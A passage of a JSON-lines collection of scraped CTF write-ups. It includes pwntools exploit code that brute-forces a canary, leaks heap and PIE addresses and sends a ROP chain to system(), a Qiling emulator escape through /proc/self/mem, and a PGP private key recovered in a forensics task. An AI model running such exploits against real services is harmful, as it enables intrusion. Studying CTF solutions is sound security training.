x in range(length):\n        flag=0\n        for _ in range(0x100):\n            log.success(f\"Trying Pos:{x}:{hex(_)}\")\n            try:\n            #if(1):\n                guess = _.to_bytes(1,'little')\n                single_req(base+res,guess)\n                res+=guess\n                flag=1\n                break\n            except:\n                p.close()\n                continue\n        if(not flag):\n            return 0\n        log.warning(hex(u64(res.ljust(8,b'\\0'))))\n    res = u64(res.ljust(8,b'\\0'))\n    log.warning(hex(res))\n    input()\n    return res\ndef canary():\n    base=b\"A\"*(0x408)+b'\\0'\n    length=7\n    return req(base,length)\ndef leak_heap():\n    global p\n\n    base = b\"A\"*(0x408)+ p64(canary_val) +b\"\\0\"*0x18\n    length = 6\n    return req(base,length)\ndef leak_pie():\n    global p\n    base = b\"A\"*(0x408)+ p64(canary_val) +b\"\\0\"*0x18\n    base+= p64(heap)+p64(0)+p64(heap-0x100)+p64(0)+b\"\\xea\"\n    length= 5\n    return req(base,length)\ndef exploit(c):\n    global p\n    p = remote(ip,port)\n    sa(\"OPT\\x00\\x03\",p32(0))\n    sn(p64(0x54504f4556414849))\n    pay = b\"A\"*(0x408)+p64(canary_val)+b\"\\0\"*0x18\n    pay += p64(heap)+p64(0)+p64(heap-0x100)+p64(0)+c\n    NBD_OPT_INFO(pay)\n    p.interactive()\nif __name__ == \"__main__\":\n    canary_val = canary()\n    heap  = leak_heap()\n    pie = leak_pie()-0x96ea\n\n    ret = 0x000000000000301a+pie \n    rdi = 0x0000000000004a58+pie\n    system = 0x3bb0+pie\n\n    \n    r = flat([\n        ret,rdi,heap+0x100*2,system\n    ])\n    exploit(r)\n\ntry:\n            subprocess.run(\n                [\"javac\", \"-cp\", DEP_FILE, SOURCE_FILE],\n                input=b\"\",\n                check=True,\n            )\n        except subprocess.CalledProcessError:\n            print(\"Failed to compile!\")\n            exit(1)\n\n        print(\"Running...\")\n        try:\n            subprocess.run([\"java\", \"--version\"])\n            subprocess.run(\n                [\n                    \"java\",\n                    \"-cp\",\n                    f\".:{DEP_FILE}\",\n                    \"-Djava.security.manager\",\n                    \"-Djava.security.policy==/dev/null\",\n                    \"Main\",\n                ],\n                check=True,\n            )\n        except subprocess.CalledProcessError:\n            print(\"Failed to run!\")\n            exit(2)\n\n    NOOP    = 0,\n    IADD    = 1,   // int add\n    ISUB    = 2,\n    IMUL    = 3,\n    ILT     = 4,   // int less than\n    IEQ     = 5,   // int equal\n    BR      = 6,   // branch\n    BRT     = 7,   // branch if true\n    BRF     = 8,   // branch if true\n    ICONST  = 9,   // push constant integer\n    LOAD    = 10,  // load from local context\n    GLOAD   = 11,  // load from global memory\n    STORE   = 12,  // store in local context\n    GSTORE  = 13,  // store in global memory\n    PRINT   = 14,  // print stack top\n    POP     = 15,  // throw away top of stack\n    CALL    = 16,  // call function at address with nargs,nlocals\n    RET     = 17,  // return value from function\n    HALT    = 18\n\n\n        char path[128] = \"../../../../../../../..\";\n        strcat(path, abs_path);\n        printf(\"path for qiling is %s\\n\",path);\n        dir_fd  = syscall(2,\".\",O_RDONLY,0666);\n        fd  = syscall(257,dir_fd, path ,flag,0666);\n        close(dir_fd);\n        return fd;\n\n\n        off = strtol(buf, (char*)buf+12, 16);\n        printf(\"python offset = %lx\\n\",off);\n        read(fd,&buf[12],40960);\n        puts(buf);\n        close(fd);\n\n\n        fd = ql_open(\"/proc/self/mem\",O_RDWR);\n        ret = lseek(fd, off+0x3FF8,SEEK_SET);\n        printf(\"seek set ret = %lx\\n\",ret);\n        unsigned long cxaf_addr = 0;\n        read(fd,&cxaf_addr,8);\n        printf(\"__cxa_finalize = %lx\\n\",cxaf_addr);\n\n\n        printf(\"__libc_addr = %lx\\n\",libc_addr);\n\n\n        ret = lseek(fd, free_addr,SEEK_SET);\n        printf(\"seek set ret = %lx\\n\",ret);\n\n\n    ru('sha256(\"')\n    tmp = ru('\"')[:-1].decode()\n    c1 = \"gcc ./pow.c -lcrypto -o ppp\".split(' ')\n    c2 = f\"./ppp {tmp}\".split(' ')\n    c3 = \"rm ./ppp\".split(' ')\n    subp = subprocess.Popen(c1)\n    subp.wait()\n    print(c2)\n    subp = subprocess.Popen(c2)\n    res,_ = subp.communicate()\n    subp = subprocess.Popen(c3)\n    subp.wait()\n    print(res,_)\n\n\n            subprocess.run(\n                [\"javac\", \"-cp\", DEP_FILE, SOURCE_FILE],\n                input=b\"\",\n                check=True,\n            )\n        except subprocess.CalledProcessError:\n            print(\"Failed to compile!\")\n            exit(1)\n\n\n        print(\"Running...\")\n        try:\n            subprocess.run([\"java\", \"--version\"])\n            subprocess.run(\n                [\n                    \"java\",\n                    \"-cp\",\n                    f\".:{DEP_FILE}\",\n                    \"-Djava.security.manager\",\n                    \"-Djava.security.policy==/dev/null\",\n                    \"Main\",\n                ],\n                check=True,\n            )\n        except subprocess.CalledProcessError:\n            print(\"Failed to run!\")\n            exit(2)\n\n\n    void listDir(String pathString) {\n        System.out.println(\"---------- \" + pathString + \"----------\");\n        File path = new File(pathString);\n        for (var name : path.list()) {\n            System.out.println(name);\n        }\n    }\n\n\n    void exp() {\n        File flag = new File(\"/flag\");\n        try {\n            FileInputStream fileInputStream = new FileInputStream(flag);\n            byte[] allBytes = fileInputStream.readAllBytes();\n            String flagString = new String(allBytes);\n            System.out.println(\"flag: \" + flagString);\n            fileInputStream.close();\n        } catch (FileNotFoundException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n        }\n    }\n", "tools": ["python", "pycryptodome", "burp", "gdb", "radare2"], "file_path": "temp_repos\\r3kapig_writeup\\20220125-rwctf4\\README.md", "file_size": 45693, "scraped_at": "2025-10-26T18:19:26.777748"}
{"id": "r3kapig_writeup_idek_2022*_Forensics_Writeup", "team": "r3kapig", "repo": "writeup", "challenge_name": "idek 2022* Forensics Writeup", "attack_type": "Misc", "writeup": "# idek 2022* Forensics Writeup\n\n## 前言:\n\nForensics类别 AK 师傅们TQL (应该是第一支AK的队伍),现将师傅们的writeup整理如下,供给大家学习与进步,另外持续招新,简历请`root@r3kapig.com`\n\n![](https://i.imgur.com/lkHUZqu.png)\n\n![](https://i.imgur.com/Cw7VyOo.png)\n\n## Pretty Good Prank:\n\nlinux内存取证，先获取到内存镜像对应的版本然后制作profile\n\n![](https://i.imgur.com/a27zJQm.png)\n\n制作完成便可开始取证，主要是看一眼命令行内容\n\n![](https://i.imgur.com/HUesFhZ.png)\n\n可以看到对Cirt.pdf用gpg进行加密后删掉了原文件，所以现在要做的就是找到相应的加密后的文件以及私钥和密码，可以直接strings寻找\n\n![](https://i.imgur.com/TbvXDBO.png)\n\n可以看到他把加密后的文件上传到了https://ufile.io/fetnsp24\n于是可以访问并下载到加密后的Cirt.pdf\n私钥也可以直接在内存里找PGP PRIVATE KEY\n\n```\n-----BEGIN PGP PRIVATE KEY BLOCK-----\n\n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\ny855KSruCg8AzgDiflXumPK5vL0i8", "solution_code": "data = open('Confidential.7z', 'rb').read()\ndata = data.replace(b'\\x0d\\x0a', b'\\x0a').replace(b'\\x0d\\x00', b'\\x0d')\nopen('out.7z', 'wb').write(data)\n\n\n#!/usr/bin/python\n\n# script built on https://stackoverflow.com/a/16682549\nimport struct\nimport time\nimport sys\n\ninfile_path = \"input\"\n\n\"\"\"\nFORMAT represents the format used by linux kernel input event struct\nSee https://github.com/torvalds/linux/blob/v5.5-rc5/include/uapi/linux/input.h#L28\nStands for: long int, long int, unsigned short, unsigned short, unsigned int\n\"\"\"\nFORMAT = 'llHHI'\nEVENT_SIZE = struct.calcsize(FORMAT)\n\n#open file in binary mode\nin_file = open(infile_path, \"rb\")\n\nevent = in_file.read(EVENT_SIZE)\n\nkeymap = {\n    0: \"KEY_RESERVED\",\n    1: \"KEY_ESC\",\n    2: \"KEY_1\",\n    3: \"KEY_2\",\n    4: \"KEY_3\",\n    5: \"KEY_4\",\n    6: \"KEY_5\",\n    7: \"KEY_6\",\n    8: \"KEY_7\",\n    9: \"KEY_8\",\n    10: \"KEY_9\",\n    11: \"KEY_0\",\n    12: \"KEY_MINUS\",\n    13: \"KEY_EQUAL\",\n    14: \"KEY_BACKSPACE\",\n    15: \"KEY_TAB\",\n    16: \"KEY_Q\",\n    17: \"KEY_W\",\n    18: \"KEY_E\",\n    19: \"KEY_R\",\n    20: \"KEY_T\",\n    21: \"KEY_Y\",\n    22: \"KEY_U\",\n    23: \"KEY_I\",\n    24: \"KEY_O\",\n    25: \"KEY_P\",\n    26: \"KEY_LEFTBRACE\",\n    27: \"KEY_RIGHTBRACE\",\n    28: \"KEY_ENTER\",\n    29: \"KEY_LEFTCTRL\",\n    30: \"KEY_A\",\n    31: \"KEY_S\",\n    32: \"KEY_D\",\n    33: \"KEY_F\",\n    34: \"KEY_G\",\n    35: \"KEY_H\",\n    36: \"KEY_J\",\n    37: \"KEY_K\",\n    38: \"KEY_L\",\n    39: \"KEY_SEMICOLON\",\n    40: \"KEY_APOSTROPHE\",\n    41: \"KEY_GRAVE\",\n    42: \"KEY_LEFTSHIFT\",\n    43: \"KEY_BACKSLASH\",\n    44: \"KEY_Z\",\n    45: \"KEY_X\",\n    46: \"KEY_C\",\n    47: \"KEY_V\",\n    48: \"KEY_B\",\n    49: \"KEY_N\",\n    50: \"KEY_M\",\n    51: \"KEY_COMMA\",\n    52: \"KEY_DOT\",\n    53: \"KEY_SLASH\",\n    54: \"KEY_RIGHTSHIFT\",\n    55: \"KEY_KPASTERISK\",\n    56: \"KEY_LEFTALT\",\n    57: \"KEY_SPACE\",\n    58: \"KEY_CAPSLOCK\",\n    59: \"KEY_F1\",\n    60: \"KEY_F2\",\n    61: \"KEY_F3\",\n    62: \"KEY_F4\",\n    63: \"KEY_F5\",\n    64: \"KEY_F6\",\n    65: \"KEY_F7\",\n    66: \"KEY_F8\",\n    67: \"KEY_F9\",\n    68: \"KEY_F10\",\n    69: \"KEY_NUMLOCK\",\n    70: \"KEY_SCROLLLOCK\",\n    71: \"KEY_KP7\",\n    72: \"KEY_KP8\",\n    73: \"KEY_KP9\",\n    74: \"KEY_KPMINUS\",\n    75: \"KEY_KP4\",\n    76: \"KEY_KP5\",\n    77: \"KEY_KP6\",\n    78: \"KEY_KPPLUS\",\n    79: \"KEY_KP1\",\n    80: \"KEY_KP2\",\n    81: \"KEY_KP3\",\n    82: \"KEY_KP0\",\n    83: \"KEY_KPDOT\",\n\n    85: \"KEY_ZENKAKUHANKAKU\",\n    86: \"KEY_102ND\",\n    87: \"KEY_F11\",\n    88: \"KEY_F12\",\n    89: \"KEY_RO\",\n    90: \"KEY_KATAKANA\",\n    91: \"KEY_HIRAGANA\",\n    92: \"KEY_HENKAN\",\n    93: \"KEY_KATAKANAHIRAGANA\",\n    94: \"KEY_MUHENKAN\",\n    95: \"KEY_KPJPCOMMA\",\n    96: \"KEY_KPENTER\",\n    97: \"KEY_RIGHTCTRL\",\n    98: \"KEY_KPSLASH\",\n    99: \"KEY_SYSRQ\",\n    100: \"KEY_RIGHTALT\",\n    101: \"KEY_LINEFEED\",\n    102: \"KEY_HOME\",\n    103: \"KEY_UP\",\n    104: \"KEY_PAGEUP\",\n    105: \"KEY_LEFT\",\n    106: \"KEY_RIGHT\",\n    107: \"KEY_END\",\n    108: \"KEY_DOWN\",\n    109: \"KEY_PAGEDOWN\",\n    110: \"KEY_INSERT\",\n    111: \"KEY_DELETE\",\n    112: \"KEY_MACRO\",\n    113: \"KEY_MUTE\",\n    114: \"KEY_VOLUMEDOWN\",\n    115: \"KEY_VOLUMEUP\",\n    116: \"KEY_POWER\",\n    117: \"KEY_KPEQUAL\",\n    118: \"KEY_KPPLUSMINUS\",\n    119: \"KEY_PAUSE\",\n    120: \"KEY_SCALE\",\n\n    121: \"KEY_KPCOMMA\",\n    122: \"KEY_HANGEUL\",\n    122: \"KEY_HANGUEL\",\n    123: \"KEY_HANJA\",\n    124: \"KEY_YEN\",\n    125: \"KEY_LEFTMETA\",\n    126: \"KEY_RIGHTMETA\",\n    127: \"KEY_COMPOSE\",\n\n    128: \"KEY_STOP\",\n    129: \"KEY_AGAIN\",\n    130: \"KEY_PROPS\",\n    131: \"KEY_UNDO\",\n    132: \"KEY_FRONT\",\n    133: \"KEY_COPY\",\n    134: \"KEY_OPEN\",\n    135: \"KEY_PASTE\",\n    136: \"KEY_FIND\",\n    137: \"KEY_CUT\",\n    138: \"KEY_HELP\",\n    139: \"KEY_MENU\",\n    140: \"KEY_CALC\",\n    141: \"KEY_SETUP\",\n    142: \"KEY_SLEEP\",\n    143: \"KEY_WAKEUP\",\n    144: \"KEY_FILE\",\n    145: \"KEY_SENDFILE\",\n    146: \"KEY_DELETEFILE\",\n    147: \"KEY_XFER\",\n    148: \"KEY_PROG1\",\n    149: \"KEY_PROG2\",\n    150: \"KEY_WWW\",\n    151: \"KEY_MSDOS\",\n    152: \"KEY_COFFEE\",\n    152: \"KEY_SCREENLOCK\",\n    153: \"KEY_ROTATE_DISPLAY\",\n    153: \"KEY_DIRECTION\",\n    154: \"KEY_CYCLEWINDOWS\",\n    155: \"KEY_MAIL\",\n    156: \"KEY_BOOKMARKS\",\n    157: \"KEY_COMPUTER\",\n    158: \"KEY_BACK\",\n    159: \"KEY_FORWARD\",\n    160: \"KEY_CLOSECD\",\n    161: \"KEY_EJECTCD\",\n    162: \"KEY_EJECTCLOSECD\",\n    163: \"KEY_NEXTSONG\",\n    164: \"KEY_PLAYPAUSE\",\n    165: \"KEY_PREVIOUSSONG\",\n    166: \"KEY_STOPCD\",\n    167: \"KEY_RECORD\",\n    168: \"KEY_REWIND\",\n    169: \"KEY_PHONE\",\n    170: \"KEY_ISO\",\n    171: \"KEY_CONFIG\",\n    172: \"KEY_HOMEPAGE\",\n    173: \"KEY_REFRESH\",\n    174: \"KEY_EXIT\",\n    175: \"KEY_MOVE\",\n    176: \"KEY_EDIT\",\n    177: \"KEY_SCROLLUP\",\n    178: \"KEY_SCROLLDOWN\",\n    179: \"KEY_KPLEFTPAREN\",\n    180: \"KEY_KPRIGHTPAREN\",\n    181: \"KEY_NEW\",\n    182: \"KEY_REDO\",\n\n    183: \"KEY_F13\",\n    184: \"KEY_F14\",\n    185: \"KEY_F15\",\n    186: \"KEY_F16\",\n    187: \"KEY_F17\",\n    188: \"KEY_F18\",\n    189: \"KEY_F19\",\n    190: \"KEY_F20\",\n    191: \"KEY_F21\",\n    192: \"KEY_F22\",\n    193: \"KEY_F23\",\n    194: \"KEY_F24\",\n\n    200: \"KEY_PLAYCD\",\n    201: \"KEY_PAUSECD\",\n    202: \"KEY_PROG3\",\n    203: \"KEY_PROG4\",\n    204: \"KEY_DASHBOARD\",\n    205: \"KEY_SUSPEND\",\n    206: \"KEY_CLOSE\",\n    207: \"KEY_PLAY\",\n    208: \"KEY_FASTFORWARD\",\n    209: \"KEY_BASSBOOST\",\n    210: \"KEY_PRINT\",\n    211: \"KEY_HP\",\n    212: \"KEY_CAMERA\",\n    213: \"KEY_SOUND\",\n    214: \"KEY_QUESTION\",\n    215: \"KEY_EMAIL\",\n    216: \"KEY_CHAT\",\n    217: \"KEY_SEARCH\",\n    218: \"KEY_CONNECT\",\n    219: \"KEY_FINANCE\",\n    220: \"KEY_SPORT\",\n    221: \"KEY_SHOP\",\n    222: \"KEY_ALTERASE\",\n    223: \"KEY_CANCEL\",\n    224: \"KEY_BRIGHTNESSDOWN\",\n    225: \"KEY_BRIGHTNESSUP\",\n    226: \"KEY_MEDIA\",\n\n    227: \"KEY_SWITCHVIDEOMODE\",\n    228: \"KEY_KBDILLUMTOGGLE\",\n    229: \"KEY_KBDILLUMDOWN\",\n    230: \"KEY_KBDILLUMUP\",\n\n    231: \"KEY_SEND\",\n    232: \"KEY_REPLY\",\n    233: \"KEY_FORWARDMAIL\",\n    234: \"KEY_SAVE\",\n    235: \"KEY_DOCUMENTS\",\n\n    236: \"KEY_BATTERY\",\n\n    237: \"KEY_BLUETOOTH\",\n    238: \"KEY_WLAN\",\n    239: \"KEY_UWB\",\n\n    240: \"KEY_UNKNOWN\",\n\n    241: \"KEY_VIDEO_NEXT\",\n    242: \"KEY_VIDEO_PREV\",\n    243: \"KEY_BRIGHTNESS_CYCLE\",\n    244: \"KEY_BRIGHTNESS_AUTO\",\n    244: \"KEY_BRIGHTNESS_ZERO\",\n    245: \"KEY_DISPLAY_OFF\",\n\n    246: \"KEY_WWAN\",\n    246: \"KEY_WIMAX\",\n    247: \"KEY_RFKILL\",\n\n    248: \"KEY_MICMUTE\"\n}\n\nshift = False\nwhile event:\n    (tv_sec, tv_usec, type, code, value) = struct.unpack(FORMAT, event)\n\n    if type != 0 or code != 0 or value != 0:\n        # print(f'{tv_sec}.{tv_usec}, {type}, {code}, {value}, {value:08b}')\n\n        if type == 0x01: # EV_KEY\n            key = keymap[code]\n            if value == 1:\n                key_label = key[4:]\n                if len(key_label) == 1:\n                    if shift:\n                        sys.stdout.write(key_label.upper())\n                    else:\n                        sys.stdout.write(key_label.lower())\n                elif \"SHIFT\" in key:\n                    print(\"SHIFT\")\n                elif key_label == \"LEFTBRACE\":\n                    sys.stdout.write(\"{\")\n                elif key_label == \"RIGHTBRACE\":\n                    sys.stdout.write(\"}\")\n                else:\n                    print(key_label)\n            else:\n                if \"SHIFT\" in key:\n                    print(\"SHIFT\")\n\n    event = in_file.read(EVENT_SIZE)\n\nin_file.close()\n\n    200: \"KEY_PLAYCD\",\n    201: \"KEY_PAUSECD\",\n    202: \"KEY_PROG3\",\n    203: \"KEY_PROG4\",\n    204: \"KEY_DASHBOARD\",\n    205: \"KEY_SUSPEND\",\n    206: \"KEY_CLOSE\",\n    207: \"KEY_PLAY\",\n    208: \"KEY_FASTFORWARD\",\n    209: \"KEY_BASSBOOST\",\n    210: \"KEY_PRINT\",\n    211: \"KEY_HP\",\n    212: \"KEY_CAMERA\",\n    213: \"KEY_SOUND\",\n    214: \"KEY_QUESTION\",\n    215: \"KEY_EMAIL\",\n    216: \"KEY_CHAT\",\n    217: \"KEY_SEARCH\",\n    218: \"KEY_CONNECT\",\n    219: \"KEY_FINANCE\",\n    220: \"KEY_SPORT\",\n    221: \"KEY_SHOP\",\n    222: \"KEY_ALTERASE\",\n    223: \"KEY_CANCEL\",\n    224: \"KEY_BRIGHTNESSDOWN\",\n    225: \"KEY_BRIGHTNESSUP\",\n    226: \"KEY_MEDIA\",\n\n\n    if type != 0 or code != 0 or value != 0:\n        # print(f'{tv_sec}.{tv_usec}, {type}, {code}, {value}, {value:08b}')\n\n\n        if type == 0x01: # EV_KEY\n            key = keymap[code]\n            if value == 1:\n                key_label = key[4:]\n                if len(key_label) == 1:\n                    if shift:\n                        sys.stdout.write(key_label.upper())\n                    else:\n                        sys.stdout.write(key_label.lower())\n                elif \"SHIFT\" in key:\n                    print(\"SHIFT\")\n                elif key_label == \"LEFTBRACE\":\n                    sys.stdout.write(\"{\")\n                elif key_label == \"RIGHTBRACE\":\n                    sys.stdout.write(\"}\")\n                else:\n                    print(key_label)\n            else:\n                if \"SHIFT\" in key:\n                    print(\"SHIFT\")\n", "tools": ["python", "john", "hashcat", "radare2", "wireshark"], "file_path": "temp_repos\\r3kapig_writeup\\20230119-idek2022-Forensics\\README.md", "file_size": 122779, "scraped_at": "2025-10-26T18:19:26.819663"}
{"id": "r3kapig_writeup_idek_2022*_MISC_&&_OSINT_&&_BlockChain_Writeup", "team": "r3kapig", "repo": "writeup", "challenge_name": "idek 2022* MISC && OSINT && BlockChain Writeup", "attack_type": "Hash", "writeup": "# idek 2022* MISC && OSINT && BlockChain Writeup\n\n## 前言 \n\n本比赛的Misc,OSINT,Blockchain题目都比较有趣,且本文会比较注重pyjail和OSINT部分,其中在比赛过程中AK了OSINT,Blockchain和MISC各差一题(都比较接近,有些可惜),当然本writeup中将其全部展示.欢迎大家交互,互相学习进步.喜欢玩国际赛的小伙伴欢迎简历`root@r3kapig.com`加入我们一起玩,我们会及时和你联系\n\n![](https://i.imgur.com/Q8OZ5q7.png)\n\n## Misc:\n\n### PHPFu...n:\n\n题目限制了只能有以下几个字符\n\n```\n([.^])',\n```\n\n基本思路就是用现有的字符造更多的字符，但是因为只要一报错就会 `die()` ，所以不能用包括 `[].''` 在内的很多方式，只能从现有的开始：\n\n```\nIn [206]: mapping = {}\n     ...: for a, b in combinations('[(,.^)]', 2):\n     ...:     x = chr(ord(a) ^ ord(b))\n     ...:     if x in mapping:\n     ...:         continue\n     ...:     mapping[x] = (a, b)\n     ...:\n\nIn [207]: mapping\nOut[207]:\n{'s': ('[', '('),\n 'w': ('[', ','),\n 'u': ('[', '.'),\n '\\x05': ('[', '^'),\n 'r': ('[', ')'),\n '\\x06': ('[', ']'),\n '\\x04': ('(', ','),\n 'v': ('(', '^'),\n '\\x01': ('(', ')'),\n '\\x02': (',', '.'),\n 'q': (',', ']'),\n 'p': ('.', '^'),\n '\\x07': ('.', ')'),\n '\\x03': ('^', ']'),\n 't': (')', ']')}\n ```\n所以现在就有了 `([.^])',swurvqpt`然后看到有 `str` 就想看看有什么能用的字符串相关的函数（https://www.php.net/manual/zh/ref.strings.php）：\n\n```\nIn [209]: str_funcs = ['addcslashes','addslashes','bin2hex','chop','chr','chunk_​split','convert_​uudecode','convert_​ne\n     ...: code','count_​chars','crc32','crypt','echo','explode','fprintf','get_​html_​translation_​table','hebrev','heni\n     ...: ','html_​entity_​decode','htmlentities','htmlspecialchars_​decode','htmlspecialchars','implode','join','lcfi't\n     